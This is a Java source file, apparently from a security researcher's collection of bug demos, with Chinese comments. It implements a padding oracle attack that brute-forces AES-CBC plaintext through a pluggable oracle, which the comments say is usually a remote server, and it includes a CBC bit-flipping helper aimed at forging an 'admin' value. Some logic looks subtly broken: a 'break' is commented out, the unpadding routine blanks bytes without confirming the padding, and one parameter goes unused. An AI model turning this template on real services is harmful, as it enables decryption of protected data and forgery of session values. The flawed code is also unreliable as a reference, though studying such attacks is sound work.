package com.threedr3am.bug.paddingoraclecbc;

import com.vip.vjtools.vjkit.security.CryptoUtil;
import com.vip.vjtools.vjkit.text.EncodeUtil;
import java.util.Arrays;
import java.util.function.Predicate;

/**
 * padding oracle java实现（多组密文实现）
 *
 * todo 用于利用padding oracle爆破出原文
 *
 * @author threedr3am
 */
public class PaddingOracle {

  public static void main(String[] args) {
    //aes iv
    String aesIv = "BSiv194+mpLpYJDOsuuBYA==";
    //aes key
    String aesKey = "e/ACMnCbFqab+v/cCIv3gA==";
    //原文
    String plain = "1dmin1dmin1dmin1dmin1dmin1dmin1dmin1dmin";
    //cbc攻击，最后期望服务器解密出的结果
    String cbcRes = "adminadminadminadminadminadminadminadmin";

    //密文bytes
    byte[] cryptTextBytes = CryptoUtil.aesEncrypt(plain.getBytes(), EncodeUtil.decodeBase64(aesKey), EncodeUtil.decodeBase64(aesIv));
    //aes iv bytes
    byte[] ivBytes = EncodeUtil.decodeBase64(aesIv);

    String paddingPlain = paddingOracle(cryptTextBytes, ivBytes, cbcRes.getBytes(), data -> {
      //前16bytes是iv
      byte[] ivTmp = Arrays.copyOfRange(data, 0, 16);
      //后16bytes是密文
      byte[] cryptTmp = Arrays.copyOfRange(data, 16, 32);
      try {
        CryptoUtil
            .aesDecrypt(cryptTmp, EncodeUtil.decodeBase64(aesKey), ivTmp);
        return true;
      } catch (Exception e) {
        return false;
      }
    });
  }

  private static String paddingOracle(byte[] cryptText, byte[] ivBytes, byte[] cbcResBytes, Predicate<byte[]> predicate) {
    byte[] middles = new byte[cryptText.length];
    byte[] data = new byte[ivBytes.length + cryptText.length];
    System.arraycopy(ivBytes, 0, data, 0, ivBytes.length);
    System.arraycopy(cryptText, 0, data, ivBytes.length, cryptText.length);
    int group = cryptText.length / 16;
    byte[] plainBytes = new byte[cryptText.length];
    //padding oracle attack
    for (int i = group - 1; i >= 0; i--) {
      byte[] iv = Arrays.copyOfRange(data, i * 16, i * 16 + 16);
      byte[] crypt = Arrays.copyOfRange(data, (i + 1) * 16, (i + 1) * 16 + 16);
      byte[] middle = paddingOracle(iv, crypt, predicate);
      System.arraycopy(middle, 0, middles, i * 16, 16);
      byte[] res = generatePlain(iv, middle);
      System.arraycopy(res, 0, plainBytes, i * 16, res.length);
      res = unpadding(res);
      System.out.println("[plain]:" + new String(res));
    }
    byte[] tmp = Arrays.copyOf(plainBytes, plainBytes.length);
    String plain = new String(unpadding(tmp));
    System.out.println("[final-plain]:" + plain);
    return plain;
  }

  /**
   * unpadding
   *
   * @param res
   * @return
   */
  private static byte[] unpadding(byte[] res) {
    int end = res[res.length - 1];
    if (end > 0 && end <= 16) {
      for (int i = 1; i <= end; i++) {
        if (res[res.length - i] != end)
          break;
      }
      for (int i = 1; i <= end; i++) {
        res[res.length - i] = ' ';
      }
    }
    return res;
  }

  /**
   * 原来的iv ^ middle = plain
   * 构造新的iv ^ middle = 'admin' -> 新的iv = middle ^ 'admin'
   *
   *
   *
   * @param iv
   * @param cryptText
   * @param cbcResBytesForPadding
   * @param plainBytes
   * @return
   */
  private static byte[] cbcAttack(byte[] iv, byte[] cryptText, byte[] cbcResBytesForPadding,
      byte[] plainBytes) {
    byte[] cbcTmp = new byte[iv.length + cbcResBytesForPadding.length];
    System.arraycopy(iv, 0, cbcTmp, 0, iv.length);
    System.arraycopy(cbcResBytesForPadding, 0, cbcTmp, iv.length, cbcResBytesForPadding.length);
    byte[] plainTmp = new byte[iv.length + plainBytes.length];
    System.arraycopy(iv, 0, plainTmp, 0, iv.length);
    System.arraycopy(plainBytes, 0, plainTmp, iv.length, plainBytes.length);
    byte[] cryptTmp = new byte[iv.length + cryptText.length];
    System.arraycopy(iv, 0, cryptTmp, 0, iv.length);
    System.arraycopy(cryptText, 0, cryptTmp, iv.length, cryptText.length);

    for (int i = cbcTmp.length - 1; i >= 16; i--) {
      if (cbcTmp[i] != plainTmp[i]) {
        cryptTmp[i - 16] = (byte) (cryptTmp[i - 16] ^ plainTmp[i] ^ cbcTmp[i]);
      }
    }
    return cryptTmp;
  }

  /**
   * cbc前需要对数据进行填充至16*n，填充规则，最后一组16bytes数据，缺多少位（例如：6），则填充6个0x06
   *
   * @param cbcResBytes 需要填充的cbc翻转的数据
   * @return 填充后的数据，可以直接用于cbc翻转攻击
   */
  private static byte[] padding(byte[] cbcResBytes) {
    //计算需要填充的位数
    int padding = 16 - cbcResBytes.length % 16;
    byte[] cbcResBytesForPadding = new byte[cbcResBytes.length + padding];
    for (int i = 0; i < cbcResBytes.length; i++) {
      cbcResBytesForPadding[i] = cbcResBytes[i];
    }
    //填充
    for (int i = 1; i <= padding; i++) {
      cbcResBytesForPadding[cbcResBytesForPadding.length - i] = (byte) padding;
    }
    return cbcResBytesForPadding;
  }

  /**
   * 与原iv异或，生成原文
   * 原来的iv ^ middle = plain
   *
   * @param ivBytesOld
   * @param middles
   * @return
   */
  private static byte[] generatePlain(byte[] ivBytesOld, byte[] middles) {
    byte[] res = new byte[ivBytesOld.length];
    for (int i = 0; i < ivBytesOld.length; i++) {
      res[i] = (byte) (ivBytesOld[i] ^ middles[i]);
    }
    return res;
  }

  /**
   * padding oracle 核心方法
   *
   * @param iv
   * @param crypt
   * @param predicate 该对象test方法用于校验是否正确，多数为调用远程服务器提交数据，根据返回来确定解密后的异或结果是否符合规则
   * @return 这一组数据的middle
   */
  private static byte[] paddingOracle(byte[] iv, byte[] crypt, Predicate<byte[]> predicate) {
    byte[] data = new byte[iv.length+crypt.length];
    System.arraycopy(iv, 0, data, 0, iv.length);
    System.arraycopy(crypt, 0, data, iv.length, crypt.length);
    byte[] middle = new byte[16];
    //用于填充的tmp值，第一轮为0x01第二轮为0x02以此类推
    byte tmp = 1;
    for (int i = 15; i >= 0; i--) {
      for (int j = 0; j < 256; j++) {
        data[i] = (byte) j;
        for (int k = 15; k > i; k--) {
          //爆破倒数第一位时不需要填充，倒数第二位时填充其后的iv为0x02，倒数第三位时填充其后的iv为0x03，以此类推
          data[k] = (byte) (middle[k] ^ tmp);
        }
        //解密返回true即正确
        if (predicate.test(data)) {
          //爆破倒数第一位的解密结果为0x01，第二位为0x02，以此类推，那么middle = iv ^ plain
          byte m = (byte) (j ^ tmp);
          middle[i] = m;
//          break;
        }
      }
      tmp++;
    }

    System.out.print("[middle]:");
    for (int i = 0; i < middle.length; i++) {
      System.out.print((0xff & middle[i]));
      if (i != middle.length - 1) {
        System.out.print(",");
      }
    }
    System.out.println();
    return middle;
  }
}
